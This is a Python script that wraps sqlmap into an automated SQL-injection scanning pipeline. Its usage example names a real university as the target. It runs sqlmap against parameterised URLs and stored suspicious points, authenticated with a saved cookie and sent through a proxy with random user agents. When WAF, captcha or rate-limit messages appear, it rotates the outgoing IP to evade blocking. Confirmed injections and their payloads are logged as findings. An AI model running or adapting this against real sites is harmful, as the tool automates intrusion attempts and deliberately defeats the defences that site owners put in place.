"""SQLmap 包装器：读 DB 含参 URL → sqlmap 扫描 → WAF 轮转 → 写 findings。

用法:
  uv run python TOOLS/pipeline/sqli_scan.py --target "台州学院" --batch 5
  uv run python TOOLS/pipeline/sqli_scan.py --target "台州学院" --url "https://example.com/api?id=1"
"""

from __future__ import annotations

import argparse
import re
import sqlite3
import subprocess
import sys
import uuid
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent
TOOLS_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(TOOLS_DIR))

SQLMAP_PROXY = "http://127.0.0.1:9870"

WAF_SQLMAP_KEYWORDS = [
    "waf",
    "blocked",
    "captcha",
    "rate limit",
    "access denied",
    "too many requests",
    "403",
]

# ── Pure functions ─────────────────────────────────────────────────────────────


def build_sqlmap_cmd(
    url: str,
    proxy: str,
    output_dir: str,
    cookie: str | None = None,
    method: str = "GET",
    data: str | None = None,
    level: int = 2,
    risk: int = 1,
) -> list[str]:
    """构建 sqlmap 命令列表。"""
    cmd = [
        "sqlmap",
        "-u",
        url,
        "--proxy",
        proxy,
        "--batch",
        "--random-agent",
        f"--level={level}",
        f"--risk={risk}",
        "--delay=2",
        "--timeout=30",
        "--output-dir",
        output_dir,
        "--flush-session",
    ]
    if cookie:
        cmd += ["--cookie", cookie]
    if method.upper() == "POST" and data:
        cmd += ["--method=POST", "--data", data]
    return cmd


def is_waf_blocked_line(line: str) -> bool:
    """检测 sqlmap 输出行是否含 WAF / 限速特征。"""
    line_lower = line.lower()
    return any(kw in line_lower for kw in WAF_SQLMAP_KEYWORDS)


def parse_sqlmap_log(log_path: Path) -> list[dict]:
    """解析 sqlmap log 文件，提取注入点信息。"""
    if not log_path.exists():
        return []
    text = log_path.read_text(errors="ignore")
    findings = []
    for m in re.finditer(
        r"Parameter:\s+(.+?)\s+\((.+?)\)\s+Type:\s+(.+?)\s+Payload:\s+(.+?)(?=\nParameter:|\n---|\Z)",
        text,
        re.DOTALL,
    ):
        findings.append(
            {
                "param": m.group(1).strip(),
                "place": m.group(2).strip(),
                "injection_type": m.group(3).strip(),
                "payload": m.group(4).strip()[:200],
            }
        )
    return findings


# ── DB helpers ────────────────────────────────────────────────────────────────


def get_param_urls(conn: sqlite3.Connection, batch: int) -> list[tuple[str, str, str]]:
    """返回 (url, method, body) 列表：pages 中含参数的 URL + SP 中参数相关条目。"""
    results: list[tuple[str, str, str]] = []

    # 来源 1: pages 表
    rows = conn.execute(
        "SELECT url FROM pages WHERE url LIKE '%?%' AND status='visited' LIMIT ?",
        (batch,),
    ).fetchall()
    results.extend((row[0], "GET", "") for row in rows)

    # 来源 2: suspicious_points 表
    rows2 = conn.execute(
        """SELECT url, method, evidence FROM suspicious_points
           WHERE test_type IN ('sqli', 'params', 'auth_bypass')
             AND test_status = 'untested'
           LIMIT ?""",
        (batch,),
    ).fetchall()
    for url, method, _ in rows2:
        results.append((url, method or "GET", ""))

    # 去重
    seen: set[str] = set()
    deduped = []
    for item in results:
        if item[0] not in seen:
            seen.add(item[0])
            deduped.append(item)
    return deduped[:batch]


def write_finding(conn: sqlite3.Connection, url: str, injection: dict) -> int:
    """将 sqlmap 确认的 SQLi 注入写入 findings 表。"""
    finding_id = f"F-SQLI-{uuid.uuid4().hex[:8]}"
    evidence = (
        f"SQLi confirmed by sqlmap | param={injection['param']} "
        f"({injection['place']}) | type={injection['injection_type']} | "
        f"payload={injection['payload']}"
    )
    conn.execute(
        """INSERT OR IGNORE INTO findings
           (id, url, type, param, method, payload, evidence, risk, confirmed_at)
           VALUES (?, ?, 'sqli', ?, 'GET', ?, ?, 'High', datetime('now','localtime'))""",
        (
            finding_id,
            url,
            injection["param"],
            injection["payload"],
            evidence,
        ),
    )
    return conn.execute("SELECT changes()").fetchone()[0]


# ── SQLmap runner ─────────────────────────────────────────────────────────────


def run_sqlmap_with_rotation(cmd: list[str]) -> str:
    """运行 sqlmap，实时监控 WAF 特征，每触发 3 次调一次 rotate_ip()。"""
    from utils.waf_rotate import rotate_ip  # noqa: PLC0415

    proc = subprocess.Popen(  # noqa: S603
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        errors="replace",
    )
    output_lines: list[str] = []
    waf_hits = 0
    if proc.stdout is None:  # noqa: S101
        return ""
    for line in proc.stdout:
        output_lines.append(line)
        if is_waf_blocked_line(line):
            waf_hits += 1
            if waf_hits % 3 == 0:
                print(f"[sqli_scan] WAF 触发 {waf_hits} 次，轮换 IP...")
                try:
                    rotate_ip()
                except Exception as e:
                    print(f"[sqli_scan] rotate_ip 失败: {e}")
    proc.wait()
    return "".join(output_lines)


# ── Main ──────────────────────────────────────────────────────────────────────


def run(target: str, db_path: str, batch: int = 5, single_url: str | None = None) -> int:
    """主执行逻辑。返回确认的 SQLi findings 数量。"""
    import urllib.parse  # noqa: PLC0415

    from db.cookie_helper import get_auth_cookie_header  # noqa: PLC0415
    from db.db_utils import connect  # noqa: PLC0415

    conn = connect(db_path)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=5000")
    cookie = get_auth_cookie_header(conn)

    output_dir = str(PROJECT_ROOT / "tmp" / "sqlmap" / target)
    Path(output_dir).mkdir(parents=True, exist_ok=True)

    if single_url:
        url_list = [(single_url, "GET", "")]
    else:
        url_list = get_param_urls(conn, batch)

    if not url_list:
        print("[sqli_scan] 无含参 URL，跳过")
        conn.close()
        return 0

    print(f"[sqli_scan] 待扫描 URL: {len(url_list)} 个")
    total_findings = 0

    for url, method, data in url_list:
        print(f"[sqli_scan] 扫描: {url}")
        cmd = build_sqlmap_cmd(
            url=url,
            proxy=SQLMAP_PROXY,
            output_dir=output_dir,
            cookie=cookie or None,
            method=method,
            data=data or None,
        )
        try:
            run_sqlmap_with_rotation(cmd)
        except FileNotFoundError:
            print("[sqli_scan] sqlmap 未安装，跳过")
            break

        # 解析结果 — sqlmap 输出目录结构: output_dir/<hostname>/log
        parsed = urllib.parse.urlparse(url)
        log_path = Path(output_dir) / parsed.netloc / "log"
        injections = parse_sqlmap_log(log_path)
        for inj in injections:
            added = write_finding(conn, url, inj)
            if added:
                total_findings += added
                print(f"[sqli_scan] CONFIRMED SQLi: {url} param={inj['param']}")

    conn.commit()
    conn.close()
    print(f"[sqli_scan] 完成: 确认 SQLi findings={total_findings}")
    return total_findings


def main() -> None:
    parser = argparse.ArgumentParser(description="SQLmap wrapper with WAF rotation")
    parser.add_argument("--target", required=True)
    parser.add_argument("--batch", type=int, default=5)
    parser.add_argument("--url", dest="single_url", default=None, help="只扫单个 URL")
    args = parser.parse_args()

    from db.db_utils import find_db  # noqa: PLC0415

    db_path = find_db(args.target)
    sys.exit(0 if run(args.target, str(db_path), args.batch, args.single_url) >= 0 else 1)


if __name__ == "__main__":
    main()
